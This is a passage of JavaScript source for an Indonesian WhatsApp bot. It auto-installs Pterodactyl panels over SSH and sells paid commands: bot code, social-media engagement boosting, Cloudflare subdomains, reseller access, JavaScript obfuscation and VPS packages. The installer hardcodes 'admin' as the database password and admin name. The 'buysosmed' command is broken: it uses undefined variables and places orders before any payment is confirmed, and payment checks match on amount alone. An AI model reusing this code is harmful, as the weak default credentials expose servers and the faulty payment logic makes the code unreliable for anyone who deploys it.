console.log('STDERR: ' + data);
});
})
}

async function instalPanel() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalWings()
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('0\n');
} 
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Database name (panel)')) {
stream.write('\n');
}
if (data.toString().includes('Database username (pterodactyl)')) {
stream.write('admin\n');
}
if (data.toString().includes('Password (press enter to use randomly generated password)')) {
stream.write('admin\n');
} 
if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
stream.write('Asia/Jakarta\n');
} 
if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Email address for the initial admin account')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Username for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('First name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Last name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Password for the initial admin account')) {
stream.write(`${passwordPanel}\n`);
} 
if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
stream.write(`${domainpanel}\n`);
} 
if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
stream.write('y\n')
} 
if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
stream.write('1\n');
} 
if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('(yes/no)')) {
stream.write('y\n');
} 
if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Still assume SSL? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Please read the Terms of Service')) {
stream.write('y\n');
}
if (data.toString().includes('(A)gree/(C)ancel:')) {
stream.write('A\n');
} 
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
});
}

ress.on('ready', async () => {
await m.reply("Memproses *install* server panel \nTunggu 1-10 menit hingga proses selsai")
ress.exec(deletemysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalPanel();
}).on('data', async (data) => {
await stream.write('\t')
await stream.write('\n')
await console.log(data.toString())
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).connect(connSettings);

            delete db.users[m.sender].installpanel;
            }
        }
    }
break;
    
case "buycase": {
    if (!text) return m.reply(example("menu"));

    // 🎨 Daftar harga untuk setiap case
    const casePrices = {
        "menu": 5000,
        "buyresellerpanel": 10000,
        "buyscript": 10000,
        "jpmallch": 5000,
        "jpmch": 5000,
        "addidch": 5000
    };

    // 🏷️ Ambil harga case berdasarkan input
    const caseName = text.trim(); // Nama case dari input pengguna
    const hargasc = casePrices[caseName];
    const amount = Number(hargasc) + generateRandomNumber(110, 250);
    if (!amount) {
        return m.reply(
            `❌ *Case "${caseName}"* tidak ditemukan atau belum memiliki harga.\n\n` +
            `💡 *Tips*: Pastikan nama case benar atau pilih dari daftar berikut:\n` +
            Object.keys(casePrices).map((key) => `- ${key}: Rp${casePrices[key]}`).join("\n")
        );
    }

    const UrlQr = global.qrisOrderKuota;

    const initiatePayment = async () => {
        try {
            const get = await axios.get(
                `https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apibotnabzx}&amount=${amount}&codeqr=${UrlQr}`
            );

            const teksPembayaran = `
╔════════════════════════╗
║      🛒 *PEMBAYARAN*      ║
╚════════════════════════╝
╔════════════════════════╗
║ 📦 *Case*: ${caseName}
║ 💰 *Harga*: Rp${amount.toLocaleString("id-ID")}
║ ⏳ *Waktu*: 5 Menit
╚════════════════════════╝

🔗 *Silakan pindai QRIS di bawah ini untuk melakukan pembayaran!*

⏳ _Jika tidak dibayar dalam waktu 5 menit, pembayaran akan *dibatalkan otomatis*_.
`;

            const msgQr = await dwiaff.sendMessage(
                m.chat,
                { image: { url: get.data.result.qrImageUrl }, caption: teksPembayaran },
                { quoted: m }
            );

            db.users[m.sender].status_deposit = true;
            db.users[m.sender].deposit = {
                msg: msgQr,
                chat: m.sender,
                idDeposit: get.data.result.transactionId,
                amount: get.data.result.amount.toString(),
                exp: function () {
                    setTimeout(async () => {
                        if (db.users[m.sender].status_deposit) {
                            await dwiaff.sendMessage(
                                db.users[m.sender].deposit.chat,
                                { text: "⚠️ *QRIS pembayaran telah expired!*" },
                                { quoted: db.users[m.sender].deposit.msg }
                            );
                            await dwiaff.sendMessage(
                                db.users[m.sender].deposit.chat,
                                { delete: db.users[m.sender].deposit.msg.key }
                            );
                            db.users[m.sender].status_deposit = false;
                            delete db.users[m.sender].deposit;
                        }
                    }, 300000);
                }
            };

            await db.users[m.sender].deposit.exp();

            while (db.users[m.sender].status_deposit) {
                await sleep(8000);
                const resultcek = await axios.get(
                    `https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apibotnabzx}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`
                );
                const req = await resultcek.data.amount;
                if (req == db.users[m.sender].deposit.amount) {
                    db.users[m.sender].status_deposit = false;

                    // ✅ Konfirmasi pembayaran berhasil
                    const getcase = (cases) => {
                        try {
                            const fileContent = fs.readFileSync('./dwiaff.js').toString();
                            const regex = new RegExp(`case\\s+["']${cases}["']([\\s\\S]*?)(?=case\\s+["']|default:|\\Z)`, 'g');
                            const match = regex.exec(fileContent);

                            if (match) {
                                return "📂 *Isi Case*: \n" + "```" + "case " + `"${cases}"` + match[1] + "```";
                            } else {
                                return null;
                            }
                        } catch (err) {
                            return null;
                        }
                    };

                    try {
                        const result = getcase(caseName);
                        if (result) {
                            m.reply(
                                `🎉 *Pembayaran berhasil!* Anda sekarang memiliki akses ke case *${caseName}*.\n\n${result}`
                            );
                        } else {
                            m.reply(`❌ *Case "${caseName}"* tidak ditemukan di sistem.`);
                        }
                    } catch (e) {
                        m.reply(`⚠️ *Error*: ${e.message}`);
                    }

                    delete db.users[m.sender].deposit;
                    return true;
                }
            }
        } catch (e) {
            return false;
        }
    };

    const paymentSuccess = await initiatePayment();

    if (!paymentSuccess) {
        return m.reply("❌ *Gagal memproses pembayaran.* Silakan coba lagi nanti.");
    }
}
break;

case 'buysosmed': {
try {
if (!text) {
return dwiaff.sendMessage(m.chat, { 
text: "❌ *Format Salah!*\n\nGunakan: *.buysosmed [ID Layanan] [Target] [Jumlah]*\n\n📌 Contoh: *.order 110 sebastianwirajaya11 1000*", 
quoted: m 
});
}
const formatIDR = (amount) => {
return amount.toLocaleString('id-ID', { style: 'currency', currency: 'IDR' }).replace('IDR', 'Rp');
};

let [service, target, quantity] = text.split(" ");
if (!service || !target || !quantity) {
return dwiaff.sendMessage(m.chat, { text: "❌ Format salah! Cek kembali perintah Anda.", quoted: m });
}
const api_id = global.api_id //api_id medanpedia;
const api_key = global.api_key // Ganti dengan API Key Anda

// 🔄 Cek harga layanan
const layananResponse = await axios.post("https://api.medanpedia.co.id/services", {
api_id,
api_key
});

const layanan = layananResponse.data.data.find(item => item.id == service);
if (!layanan) {
return dwiaff.sendMessage(m.chat, { text: "❌ Layanan tidak ditemukan!", quoted: m });
}


// 🔄 Cek saldo pengguna di MedanPedia
const saldoResponse = await axios.post("https://api.medanpedia.co.id/profile", {
api_id,
api_key
});

let saldoUser = saldoResponse.data.data.balance; // Ambil saldo pengguna

// 🔄 Hitung total harga pemesanan
let hargaPer1000 = layanan.price + global.keuntungan;
let totalHarga = (hargaPer1000 / 1000) * quantity;

// 🔍 Cek apakah saldo cukup
if (saldoUser < totalHarga) {
return dwiaff.sendMessage(m.chat, { 
text: `❌ *Saldo MedanPedia tidak mencukupi!*\n\n💰 *Saldo Anda:* ${formatIDR(saldoUser)}\n🔖 *Total Harga:* ${formatIDR(totalHarga)}\n\n🚀 Silakan isi saldo terlebih dahulu atau gunakan metode pembayaran QRIS.`,
quoted: m 
});
}

const UrlQr = global.qrisOrderKuota
let biayaAdmin = Math.ceil(totalHarga / 5000) * 1000;
let totalBayar = totalHarga + biayaAdmin;
// ❌ Jika saldo tidak cukup, lanjut ke QRIS
let totalAdmin = Number(totalBayar) + generateRandomNumber(110, 250);
const get = await axios.get(`https://simpelz.limganteng.web.id/api/orkut/createpayment?apikey=lim2026&amount=${totalAdmin}&codeqr=${UrlQr}`);

const teksQR = `
╔═════════════════════════════╗
║ 💰 *INFORMASI PEMBAYARAN* 🔥
╠═════════════════════════════╣
║ 📅 *Tanggal:* ${new Date().toLocaleDateString('id-ID')}
║ ⏰ *Waktu:* ${new Date().toLocaleTimeString('id-ID')} WIB
║ 💰 *Total Bayar:* Rp${totalBayar.toLocaleString("id-ID")}
║ 🏷️ *Harga Layanan:* Rp${totalHarga.toLocaleString("id-ID")}
║ 📌 *Biaya Admin:* Rp${biayaAdmin.toLocaleString("id-ID")}
║ 🎯 *Layanan:* ${layanan.name}
║ 🔗 *Target:* ${target}
║ ⏳ *Expired:* 10 Menit
╠═════════════════════════════╣
║ 📌 *CATATAN PENTING:*
║ 1️⃣ Kode QR hanya berlaku selama *10 menit*.
║ 2️⃣ Jika pembayaran dilakukan setelah batas waktu, transaksi akan *dibatalkan otomatis*.
║ 3️⃣ Pastikan jumlah pembayaran *sesuai* dengan yang tertera.
║ 4️⃣ Setelah pembayaran berhasil, pesanan akan *diproses otomatis*.
║ 5️⃣ Jika ada kendala, segera hubungi admin.
╠═════════════════════════════╣
║ ❌ *Batal Pembayaran?*
║ ➤ Ketik: *.batalbuy*
╚═════════════════════════════╝
`;
//isi sistem orkut

// Menyimpan kembali data transaksi ke file
fs.writeFileSync(transaksiPath, JSON.stringify(transaksiData, null, 2), 'utf8');
const ownerNumber = "6282245415403@s.whatsapp.net";
const ownerNotif = `
╭━━━〔 ⚡ *NOTIFIKASI ORDER* ⚡ 〕━━━╮
┃ 🛍️ *Pembelian Buy SosialMedia*
┃ 👤 *Pembeli*: @${m.sender}
┃ 💰 *Harga*: Rp ${totalAdmin}
┃ 🔗 *Metode*: *Saweria*
┃ 📅 *Tanggal*: ${new Date().toLocaleDateString('id-ID')}
┃ ⏰ *Waktu*: ${new Date().toLocaleTimeString('id-ID')}
╰━━━━━━━━━━━━━━━━━━━━━━━━━━╯
`;
await dwiaff.sendMessage(ownerNumber, { text: ownerNotif }, { quoted: null });
// 🔄 Lakukan pemesanan setelah pembayaran berhasil
const orderResponse = await axios.post("https://api.medanpedia.co.id/order", {
api_id,
api_key,
service: parseInt(db.users[m.sender].saweria.service),
target: db.users[m.sender].saweria.target,
quantity: parseInt(db.users[m.sender].saweria.quantity)
});

// Cek jika pemesanan gagal
if (!orderResponse.data.status) {
return dwiaff.sendMessage(m.chat, { 
text: `❌ *Pemesanan Gagal!*\n📝 *Pesan:* ${orderResponse.data.msg || "Tidak ada informasi tambahan."}`, 
quoted: m 
});
}

// Ambil ID pesanan dari response yang benar
let orderID = orderResponse.data.data.id;

let orderText = `🛒 *PEMESANAN BERHASIL!*\n`;
orderText += `━━━━━━━━━━━━━━━━━━━━━━\n`;
orderText += `🆔 *Order ID:* ${orderID}\n`;
orderText += `📌 *Layanan:* ${layanan.name}\n`;
orderText += `🎯 *Target:* ${db.users[m.sender].saweria.target}\n`;
orderText += `📦 *Jumlah:* ${db.users[m.sender].saweria.quantity}\n`;
orderText += `💰 *Dibayar Pakai QRIS!*\n`;
orderText += `📅 *Waktu Order:* ${new Date().toLocaleString("id-ID")}\n`;
orderText += `━━━━━━━━━━━━━━━━━━━━━━\n`;

const adminSections = [
{
title: "Pilih Silahkan Cek",
rows: [
{
title: "Get Status Suntik",
rowId: `.cekpesanan ${orderID}`,
description: "Cek Status Pesanan"
}
]
}
];

const adminListMessage = {
text: orderText,
footer: "📌 dwiaffii - OfficiaL",
title: "Pilih",
buttonText: "klick Sini :)",
sections: adminSections
};

await dwiaff.sendMessage(m.chat, adminListMessage, { quoted: m });

} catch (error) {
console.error("Error:", error);
dwiaff.sendMessage(m.chat, { text: "❌ *Terjadi kesalahan sistem!*", quoted: m });
}
break
}    

case "detaillayanan": {
  try {
if (!text) {
  return await dwiaff.sendMessage(m.chat, { text: `❌ Masukkan *Kode Produk* yang ingin dicek!\n\n📌 Contoh: *.detaillayanan 1*` });
}

const response = await axios.post("https://api.medanpedia.co.id/services", {
  api_id: global.api_id,
  api_key: global.api_key
});

if (response.data.status) {
  const layanan = response.data.data.find(service => service.id.toString() === text);

  if (!layanan) {
return await dwiaff.sendMessage(m.chat, { text: `❌ Tidak ditemukan layanan dengan kode produk *"${text}"*.` });
  }

  let detailLayanan = `
╔═════════════════════════════╗
║ 🚀 *DETAIL LAYANAN* 🚀
╠═════════════════════════════╣
║ 🆔 *ID:* ${layanan.id}
║ 📌 *Nama:* ${layanan.name}
║ 📂 *Kategori:* ${layanan.category}
║ 💰 *Harga:* Rp ${layanan.price.toLocaleString("id-ID")}
║ 🔢 *Min:* ${layanan.min}  |  *Max:* ${layanan.max}
║ 🔄 *Refill:* ${layanan.refill ? "✅ Ya" : "❌ Tidak"}
║ 🕒 *Waktu Rata-rata:* ${layanan.average_time}
║ 📜 *Deskripsi:* ${layanan.description}
╚═════════════════════════════╝

📌 *CARA ORDER*  
╔═════════════════════════════╗
║ 📌 *Format:*  
║ ✏️ *.buysosmed [ID Layanan] [Target (Link)] [Jumlah]*  
║ ✅ *Contoh:*  
║ 🔹 *.buysosmed ${layanan.id} https://instagram.com/user 1000*  
╚═════════════════════════════╝

📌 *CARA REFILL*  
╔═════════════════════════════╗
║ 🔄 *Jika pesanan belum masuk, ajukan refill!*  
║ 📌 *Format:*  
║ ✏️ *.buatrefill [ID Pesanan]*  
║ ✅ *Contoh:*  
║ 🔹 *.buatrefill 123456*  
╚═════════════════════════════╝

📌 *CARA CEK STATUS PESANAN*  
╔═════════════════════════════╗
║ 📊 *Pantau pesanan Anda kapan saja!*  
║ 📌 *Format:*  
║ ✏️ *.cekstatus [ID Pesanan]*  
║ ✅ *Contoh:*  
║ 🔹 *.cekstatus 123456*  
╚═════════════════════════════╝

⚡ *Pesan Sekarang & Nikmati Layanan Premium!*  
`;

  await dwiaff.sendMessage(m.chat, { 
image: { url: "https://files.catbox.moe/s4fo5t.jpg" }, 
caption: detailLayanan 
  }, { quoted: m });

} else {
  await dwiaff.sendMessage(m.chat, { text: `❌ ${response.data.msg}` });
}

  } catch (error) {
console.error("Error:", error);
await dwiaff.sendMessage(m.chat, { text: "❌ Gagal mengambil detail layanan. Coba lagi nanti." });
  }
  break
}    
  
  case 'carilayanan': {
try {
// Pastikan input tersedia
if (!text) {
return dwiaff.sendMessage(m.chat, { 
text: "❌ Gunakan format: *.carilayanan [nama_apk]*\n\nContoh: *.carilayanan tiktok*" }, { quoted: m });
}

const api_id = global.api_id //api_id medanpedia;  
const api_key = global.api_key  
const keyword = text.toLowerCase();

// Mengambil data layanan dari API
const response = await axios.post("https://api.medanpedia.co.id/services", {
api_id,
api_key
});

if (!response.data.status) {
return dwiaff.sendMessage(m.chat, { text: `❌ ${response.data.msg}` }, { quoted: m });
}

const layananFiltered = response.data.data.filter(service => service.name.toLowerCase().includes(keyword));

if (layananFiltered.length === 0) {
return dwiaff.sendMessage(m.chat, { 
text: `❌ Tidak ditemukan layanan untuk *${text}*.`}, { quoted: m });
}

let layananText = `┏━━━━━━━━━━━━━━━━━━━━━\n` +
  `┃ 🔍 *Hasil Pencarian Layanan (${text})*\n` +
  `┗━━━━━━━━━━━━━━━━━━━━━\n\n` +
  layananFiltered.map(l => 
  `┏━━━━━━━━━━━━━━━━━━━━━\n` +
  `┃ 📌 *ID*: ${l.id}\n` +
  `┃ 📋 *Nama*: ${l.name}\n` +
  `┃ 💰 *Harga*: Rp ${l.price.toLocaleString("id-ID")}\n` +
  `┃ 📊 *Min-Max*: ${l.min} - ${l.max}\n` +
  `┃ 📂 *Kategori*: ${l.category}\n` +
  `┗━━━━━━━━━━━━━━━━━━━━━`
  ).join("\n\n");

// Menyiapkan sections untuk button list
const sections = [{
title: `Layanan ${text}`,
rows: layananFiltered.map(l => ({
title: `📌 ${l.name}`,
rowId: `.detaillayanan ${l.id}`,
description: `💰 Rp ${l.price.toLocaleString("id-ID")} | Min: ${l.min} - Max: ${l.max}`
}))
}];

const listMessage = {
text: layananText,
buttonText: "Pilih Layanan",
sections
};

await dwiaff.sendMessage(m.chat, listMessage, { quoted: m });

} catch (error) {
console.error(error);
dwiaff.sendMessage(m.chat, { 
text: "❌ Terjadi kesalahan saat mencari layanan."}, { quoted: m });
}
break
}      

case 'ordersosmed': {
try {
const response = await axios.post("https://api.medanpedia.co.id/services", {
api_id: global.api_id, //api_id medanpedia,
api_key: global.api_key 
});

if (!response.data.status) {
return dwiaff.sendMessage(m.chat, { text: "❌ Gagal mengambil kategori: " + response.data.msg }, { quoted: m });
}

const layanan = response.data.data;
let apkSet = new Set();

// Mengambil hanya nama APK unik dari awal string
layanan.forEach(service => {
if (service.name && typeof service.name === "string") {
let apkName = service.name.trim().split(/\s+/)[0]; // Ambil kata pertama dengan lebih aman
if (apkName.length > 1) { // Hindari karakter kosong atau hanya satu huruf
apkSet.add(apkName.toLowerCase());
}
}
});

let apkList = Array.from(apkSet).map(name => name.charAt(0).toUpperCase() + name.slice(1)); // Kapitalisasi nama APK

if (apkList.length === 0) {
return dwiaff.sendMessage(m.chat, { text: "⚠️ Tidak ada kategori yang tersedia." }, { quoted: m });
}

// Menyiapkan sections untuk button list
const sections = [{
title: "Daftar APK Tersedia",
rows: apkList.map(apk => ({
title: `📌 ${apk}`,
rowId: `.carilayanan ${apk.toLowerCase()}`,
description: `Cari layanan untuk ${apk}`
}))
}];

const listMessage = {
text: "📂 *Silakan pilih APK di bawah ini:*",
buttonText: "Pilih APK",
sections
};

await dwiaff.sendMessage(m.chat, listMessage, { quoted: m });

} catch (error) {
console.error("Error mengambil data APK:", error);
dwiaff.sendMessage(m.chat, { text: "❌ Terjadi kesalahan saat mengambil data." }, { quoted: m });
}
break
}    

case "buysubdo": {
    if (!text) return m.reply("⚠️ *Masukkan IP VPS dan Nama Subdomain!*\nContoh: 192.168.1.1|mypanel");

    const args = text.split("|");
    if (args.length < 2) return m.reply("⚠️ Format salah! Gunakan: IP|Subdomain");

    const ip = args[0].trim();
    const namaSub = args[1].trim().toLowerCase();
    const domainUtama = global.domainbuy
    const subdomain1 = `${namaSub}.${domainUtama}`;
    const subdomain2 = `node.${namaSub}.${domainUtama}`;
    const amount = 5000;
    const UrlQr = global.qrisOrderKuota;

    // Validasi IP
    if (!/^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(ip)) {
        return m.reply("⚠️ Format IP tidak valid!");
    }

    // Buat QR pembayaran
    const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apibotnabzx}&amount=${amount}&codeqr=${UrlQr}`);
    const teksPembayaran = `
━━━━━━━━━━━━━━━━━━━━━━━
       🌐 *PEMBAYARAN DOMAIN* 🌐
━━━━━━━━━━━━━━━━━━━━━━━
📌 *ID Transaksi:* ${get.data.result.transactionId}
💰 *Biaya:* Rp${await toIDR(get.data.result.amount)}
⏱️ *Expired:* 5 Menit
📎 *Metode:* QRIS

📝 Setelah pembayaran berhasil, domain akan langsung dibuat:
🔹 ${subdomain1}
🔹 ${subdomain2}
━━━━━━━━━━━━━━━━━━━━━━━
Ketik *.batalbeli* untuk membatalkan.
`;

    let msgQr = await dwiaff.sendMessage(m.chat, {
        image: { url: get.data.result.qrImageUrl },
        caption: teksPembayaran
    }, { quoted: m });

    db.users[m.sender].status_deposit = true;
    db.users[m.sender].domainOrder = {
        msg: msgQr,
        chat: m.sender,
        idDeposit: get.data.result.transactionId,
        amount: get.data.result.amount.toString(),
        ip,
        namaSub,
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_deposit) {
                    await dwiaff.sendMessage(this.chat, { text: "❌ *QRIS telah expired!*" }, { quoted: this.msg });
                    await dwiaff.sendMessage(this.chat, { delete: this.msg.key });
                    db.users[m.sender].status_deposit = false;
                    delete db.users[m.sender].domainOrder;
                }
            }, 300000);
        }
    };

    await db.users[m.sender].domainOrder.exp();

    while (db.users[m.sender].status_deposit) {
        await sleep(8000);
        const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apibotnabzx}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
        const req = await resultcek.data.amount;

        if (req == db.users[m.sender].domainOrder.amount) {
            db.users[m.sender].status_deposit = false;

            const zone = global.cfzone
            const apikey = global.cfapi

            async function createSubdomain(host, ip) {
                return axios.post(`https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`, {
                    type: "A", name: host, content: ip, ttl: 3600, proxied: false
                }, {
                    headers: {
                        Authorization: `Bearer ${apikey}`,
                        "Content-Type": "application/json"
                    }
                });
            }

            try {
                await createSubdomain(subdomain1, ip);
                await createSubdomain(subdomain2, ip);

                await dwiaff.sendMessage(m.sender, {
                    text: `✅ *Pembayaran Berhasil!*\n\n🌐 Domain berhasil dibuat:\n🔸 ${subdomain1}\n🔸 ${subdomain2}\n📌 IP: ${ip}`
                }, { quoted: db.users[m.sender].domainOrder.msg });

                delete db.users[m.sender].domainOrder;
            } catch (err) {
                return m.reply(`❌ *Gagal membuat subdomain!* Error:\n${err.message}`);
            }
        }
    }
}
break;
    
case "buyresellerpanel": {
    if (m.quoted || text) {
        let orang = m.mentionedJid[0] 
            ? m.mentionedJid[0] 
            : text 
                ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' 
                : m.quoted 
                    ? m.quoted.sender 
                    : '';
                    
        if (reseller.includes(orang)) return m.reply(`⚠️ *User ${orang.split('@')[0]} sudah terdaftar di database reseller panel!*`);

        const amount = 10000; // Biaya untuk menjadi reseller
        const UrlQr = global.qrisOrderKuota;

        // Buat QRIS pembayaran
        const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apibotnabzx}&amount=${amount}&codeqr=${UrlQr}`);
        const teksPembayaran = `
━━━━━━━━━━━━━━━━━━━━━━━
       💎 *𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 𝙋𝙀𝙈𝘽𝘼𝙔𝘼𝙍𝘼𝙉* 💎
━━━━━━━━━━━━━━━━━━━━━━━

📌 *• ID Transaksi :* ${get.data.result.transactionId}
📌 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
📌 *• Metode :* QRIS
📌 *• Expired :* 5 menit

📝 *Note:*
⚠️ QRIS pembayaran hanya berlaku dalam *5 menit*.  
✅ Setelah pembayaran berhasil, Anda akan otomatis menjadi *Reseller Panel*.

🔻 Ketik *.batalbeli* untuk membatalkan transaksi.  
━━━━━━━━━━━━━━━━━━━━━━━
`;

        let msgQr = await dwiaff.sendMessage(m.chat, { 
            image: { url: get.data.result.qrImageUrl }, 
            caption: teksPembayaran 
        }, { quoted: m });

        db.users[m.sender].status_deposit = true;
        db.users[m.sender].addseller = {
            msg: msgQr,
            chat: m.sender,
            idDeposit: get.data.result.transactionId,
            amount: get.data.result.amount.toString(),
            target: orang, // User yang akan dijadikan reseller
            exp: function () {
                setTimeout(async () => {
                    if (db.users[m.sender].status_deposit) {
                        await dwiaff.sendMessage(
                            db.users[m.sender].addseller.chat, 
                            { text: "❌ *QRIS pembayaran telah expired!*" }, 
                            { quoted: db.users[m.sender].addseller.msg }
                        );
                        await dwiaff.sendMessage(
                            db.users[m.sender].addseller.chat, 
                            { delete: db.users[m.sender].addseller.msg.key }
                        );
                        db.users[m.sender].status_deposit = false;
                        delete db.users[m.sender].addseller;
                    }
                }, 300000);
            }
        };

        await db.users[m.sender].addseller.exp();

        // Cek status pembayaran secara berkala
        while (db.users[m.sender].status_deposit) {
            await sleep(8000);
            const resultcek = await axios.get(`https://nabzxapibot.vercel.app//api/orkut/cekstatus?apikey=${global.apibotnabzx}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
            const req = await resultcek.data.amount;
            if (req == db.users[m.sender].addseller.amount) {
                db.users[m.sender].status_deposit = false;

                // Tambahkan pengguna sebagai reseller
                await reseller.push(db.users[m.sender].addseller.target);
                await fs.writeFileSync("./database/reseller.json", JSON.stringify(reseller));

                await dwiaff.sendMessage(
                    db.users[m.sender].addseller.chat, 
                    { text: `✅ *Pembayaran berhasil!*\n👤 User *${db.users[m.sender].addseller.target.split('@')[0]}* telah ditambahkan sebagai *Reseller Panel*.` }, 
                    { quoted: db.users[m.sender].addseller.msg }
                );

                m.reply(`🎉 *Selamat!*\n👤 User *${db.users[m.sender].addseller.target.split('@')[0]}* telah berhasil menjadi *Reseller Panel* ✅\n\n🔗 *Silahkan bergabung ke grup reseller di bawah ini:*\n${linkgcreseller}`);
                delete db.users[m.sender].addseller;
            }
        }
    } else {
        return m.reply(`⚠️ *Cara penggunaan:* Ketik *${command} 628XXX*`);
    }
}
break;        

case "jasaenc": case "jasaencrypt": {     
    if (!m.quoted) return m.reply(example("dengan reply file .js"));   
    if (mime !== "application/javascript" && mime !== "text/javascript") return m.reply("Reply file .js");   
    
    const hargaenc = 5000; 
    const amount = Number(hargaenc) + generateRandomNumber(110, 250);
    const UrlQr = global.qrisOrderKuota;
    
    const get = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/createpayment?apikey=${global.apibotnabzx}&amount=${amount}&codeqr=${UrlQr}`);
    const teksPembayaran = `
━━━━━━━━━━━━━━━━━━━━━━━
       🔐 *𝙀𝙉𝘾𝙍𝙔𝙋𝙏 𝙋𝘼𝙔𝙈𝙀𝙉𝙏* 🔐
━━━━━━━━━━━━━━━━━━━━━━━

📌 *• ID Transaksi :* ${get.data.result.transactionId}
📌 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
📌 *• Metode :* QRIS
📌 *• Expired :* 5 menit

📝 *Note:*
⚠️ QRIS pembayaran hanya berlaku dalam *5 menit*.  
✅ Setelah pembayaran berhasil, fitur *Encrypt* akan aktif.

🔻 Ketik *.batalbeli* untuk membatalkan transaksi.  
━━━━━━━━━━━━━━━━━━━━━━━
`;

    let msgQr = await dwiaff.sendMessage(m.chat, { 
        image: { url: get.data.result.qrImageUrl }, 
        caption: teksPembayaran 
    }, { quoted: m });

    db.users[m.sender].status_encrypt = true;
    db.users[m.sender].encrypt = {
        msg: msgQr,
        chat: m.sender,
        idDeposit: get.data.result.transactionId,
        amount: get.data.result.amount.toString(),
        file: m.quoted,
        exp: function () {
            setTimeout(async () => {
                if (db.users[m.sender].status_encrypt) {
                    await dwiaff.sendMessage(
                        db.users[m.sender].encrypt.chat, 
                        { text: "❌ *QRIS pembayaran telah expired!*" }, 
                        { quoted: db.users[m.sender].encrypt.msg }
                    );
                    db.users[m.sender].status_encrypt = false;
                    delete db.users[m.sender].encrypt;
                }
            }, 300000);
        }
    };
    
    await db.users[m.sender].encrypt.exp();
    
    while (db.users[m.sender].status_encrypt) {
        await sleep(8000);
        const resultcek = await axios.get(`https://nabzxapibot.vercel.app/api/orkut/cekstatus?apikey=${global.apibotnabzx}&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`);
        const req = await resultcek.data.amount;
        if (req == db.users[m.sender].encrypt.amount) {
            db.users[m.sender].status_encrypt = false;

            let media = await db.users[m.sender].encrypt.file.download();    
            let filename = db.users[m.sender].encrypt.file.message.documentMessage.fileName;    
            let filePath = `./database/sampah/${filename}`;    
    
            try {    
                await fs.writeFileSync(filePath, media);    
                await m.reply("Memproses encrypt code . . .");    
    
                let obfuscated = await JsConfuser.obfuscate(await fs.readFileSync(filePath, "utf8"), {    
                    target: "node",    
                    preset: "high",    
                    calculator: true,    
                    compact: true,    
                    hexadecimalNumbers: true,    
                    controlFlowFlattening: 0.75,    
                    deadCode: 0.2,    
                    dispatcher: true,    
                    duplicateLiteralsRemoval: 0.75,    
                    flatten: true,    
                    globalConcealing: true,    
                    identifierGenerator: "randomized",    
                    minify: true,    
                    movedDeclarations: true,    
                    objectExtraction: true,    
                    opaquePredicates: 0.75,    
                    renameVariables: true,    
                    renameGlobals: true,    
                    shuffle: { hash: 0.5, true: 0.5 },    
                    stringConcealing: true,    
                    stringCompression: true,    
                    stringEncoding: true,    
                    stringSplitting: 0.75,    
                    rgf: false    
                });    
    
                await fs.writeFileSync(filePath, obfuscated.code);    
    
                await dwiaff.sendMessage(m.chat, {    
                    document: fs.readFileSync(filePath),    
                    mimetype: "application/javascript",    
                    fileName: filename,    
                    caption: "Encrypt file sukses ✅"    
                }, { quoted: m });    
    
            } catch (e) {    
                m.reply("Error: " + e.message);    
            } finally {    
                if (fs.existsSync(filePath)) {    
                    fs.unlinkSync(filePath);    
                }    
            }    
            delete db.users[m.sender].encrypt;
        }
    }
}    
break;

case "buyvpsdo": {
    if (m.isGroup) return m.reply(mess.private);;
    if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!");

    let teks = `
*乂 List Paket VPS yang Tersedia*

*1.* Ram 2GB & CPU 1 - Rp25.000
*2.* Ram 4GB & CPU 2 - Rp35.000
